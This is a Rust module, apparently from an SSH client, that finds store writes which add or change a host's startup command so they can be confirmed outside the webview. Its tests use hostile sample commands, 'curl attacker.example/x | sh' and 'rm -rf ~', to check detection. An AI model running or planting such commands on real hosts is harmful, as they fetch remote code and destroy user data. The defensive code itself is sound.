//! Which store writes put a startup command on a host.
//!
//! A host's startup command is typed into its shell on every connect. The
//! store is written from the webview, and while a page is running it can type
//! into any session it opens anyway, so the command is not a new power for the
//! page that writes it. It is a lasting one: a stored command keeps running on
//! every later connect, long after whatever wrote it is gone, and nothing on
//! the way to a connection shows it. A write that puts a command on a host, or
//! changes the one it has, is therefore confirmed outside the page, like a new
//! key reach. Removing or clearing a command is not: that runs nothing.

use crate::connection::credentials;
use crate::host::Host;
use crate::store::StoreData;
use std::collections::HashSet;
use uuid::Uuid;

/// A saved host whose startup command is not one that host already had.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NewCommand {
    pub host_id: Uuid,
    pub host_label: String,
    /// The account the command runs as, resolved the way a connection
    /// resolves it, or the host's own when its identity link is broken.
    pub username: String,
    pub hostname: String,
    pub port: u16,
    pub command: String,
}

/// The command `host` types on connect. An empty command is never sent, so it
/// is the same as none.
fn command(host: &Host) -> Option<&str> {
    host.startup_command.as_deref().filter(|command| !command.is_empty())
}

/// Every host in `after` whose startup command is not one a host with the same
/// id has in `before`, in host order.
///
/// The comparison is by host id, so a command moves along with its host when
/// the host is edited, while a copy of a host under a new id is a new command
/// even if the copied host already ran it: nothing has confirmed that the copy
/// runs it. Every stored record counts, including a second one under an id
/// already in use.
pub fn introduced(before: &StoreData, after: &StoreData) -> Vec<NewCommand> {
    if before.hosts == after.hosts {
        return Vec::new();
    }
    let allowed: HashSet<(Uuid, &str)> = before
        .hosts
        .iter()
        .filter_map(|host| Some((host.id, command(host)?)))
        .collect();
    let mut listed = HashSet::new();
    after
        .hosts
        .iter()
        .filter_map(|host| Some((host, command(host)?)))
        .filter(|(host, command)| {
            !allowed.contains(&(host.id, *command)) && listed.insert((host.id, *command))
        })
        .map(|(host, command)| NewCommand {
            host_id: host.id,
            host_label: host.label.clone(),
            username: credentials(host, after.linked_identity(host))
                .map(|resolved| resolved.username)
                .unwrap_or(&host.username)
                .to_owned(),
            hostname: host.hostname.clone(),
            port: host.port,
            command: command.to_owned(),
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::identity::Identity;

    fn host_running(command: Option<&str>) -> Host {
        let mut host = Host::new("prod", "prod.example", 22, "deploy");
        host.startup_command = command.map(str::to_owned);
        host
    }

    fn with_hosts(hosts: Vec<Host>) -> StoreData {
        StoreData {
            hosts,
            ..StoreData::default()
        }
    }

    fn commands(found: &[NewCommand]) -> Vec<&str> {
        found.iter().map(|new| new.command.as_str()).collect()
    }

    #[test]
    fn a_new_host_with_a_command_introduces_it() {
        let host = host_running(Some("tmux attach"));
        let found = introduced(&StoreData::default(), &with_hosts(vec![host.clone()]));
        assert_eq!(
            found,
            [NewCommand {
                host_id: host.id,
                host_label: "prod".into(),
                username: "deploy".into(),
                hostname: "prod.example".into(),
                port: 22,
                command: "tmux attach".into(),
            }]
        );
    }

    #[test]
    fn adding_or_changing_a_command_introduces_it() {
        let quiet = host_running(None);
        let mut added = quiet.clone();
        added.startup_command = Some("uptime".into());
        let before = with_hosts(vec![quiet]);
        assert_eq!(commands(&introduced(&before, &with_hosts(vec![added.clone()]))), ["uptime"]);

        let mut changed = added.clone();
        changed.startup_command = Some("curl attacker.example/x | sh".into());
        assert_eq!(
            commands(&introduced(&with_hosts(vec![added]), &with_hosts(vec![changed]))),
            ["curl attacker.example/x | sh"]
        );
    }

    #[test]
    fn keeping_clearing_or_removing_a_command_introduces_nothing() {
        let host = host_running(Some("uptime"));
        let before = with_hosts(vec![host.clone()]);

        let mut renamed = host.clone();
        renamed.label = "production".into();
        renamed.hostname = "prod2.example".into();
        assert!(introduced(&before, &with_hosts(vec![renamed])).is_empty());

        for cleared in [None, Some(String::new())] {
            let mut edited = host.clone();
            edited.startup_command = cleared;
            assert!(introduced(&before, &with_hosts(vec![edited])).is_empty());
        }
        assert!(introduced(&before, &StoreData::default()).is_empty());
    }

    #[test]
    fn a_copy_under_a_new_id_introduces_the_command_it_copied() {
        let host = host_running(Some("uptime"));
        let mut copy = host.clone();
        copy.id = Uuid::new_v4();
        let found = introduced(&with_hosts(vec![host.clone()]), &with_hosts(vec![host, copy.clone()]));
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].host_id, copy.id);
    }

    #[test]
    fn a_second_record_under_a_known_id_is_checked_too() {
        let host = host_running(Some("uptime"));
        let mut twin = host.clone();
        twin.startup_command = Some("rm -rf ~".into());
        let found = introduced(&with_hosts(vec![host.clone()]), &with_hosts(vec![host, twin]));
        assert_eq!(commands(&found), ["rm -rf ~"]);
    }

    #[test]
    fn the_account_is_the_one_a_connection_would_use() {
        let identity = Identity::new("ops", "root");
        let mut host = host_running(Some("uptime"));
        host.identity_id = Some(identity.id);
        let mut after = with_hosts(vec![host.clone()]);
        after.identities.push(identity);
        assert_eq!(introduced(&StoreData::default(), &after)[0].username, "root");

        // A broken link is refused at connect time; the host's own account is
        // shown rather than nothing.
        assert_eq!(
            introduced(&StoreData::default(), &with_hosts(vec![host]))[0].username,
            "deploy"
        );
    }
}
